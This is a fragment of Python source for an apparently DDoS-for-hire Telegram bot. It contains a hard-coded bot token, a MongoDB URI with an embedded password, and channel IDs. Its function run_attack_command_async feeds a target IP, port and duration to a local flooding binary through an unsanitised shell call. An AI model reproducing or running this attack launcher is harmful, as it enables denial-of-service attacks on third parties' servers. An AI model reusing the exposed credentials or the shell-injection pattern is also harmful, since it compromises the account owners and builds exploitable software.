...
TOKEN = '7121880159:AAFN-dU4tuArUVdEIgItVsICzQZmRVozA5M'
MONGO_URI = 'mongodb+srv://SkyveniX:bgmi_009@cluster0.erxioab.mongodb.net/?retryWrites=true&w=majority'
FORWARD_CHANNEL_ID = -1002329214096
CHANNEL_ID = -1002329214096
error_channel_id = -1002329214096
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./m {target_ip} {target_port} {duration} 500")
